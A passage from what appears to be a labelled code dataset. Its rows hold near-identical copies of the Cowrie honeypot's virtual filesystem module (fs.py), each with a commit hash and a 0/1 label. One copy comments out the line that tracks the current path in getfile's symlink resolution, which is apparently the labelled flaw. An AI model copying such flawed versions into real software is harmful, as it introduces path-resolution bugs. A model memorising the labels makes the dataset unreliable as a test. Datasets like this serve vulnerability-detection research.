        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",0
159,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"/cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",1
160,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            # cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
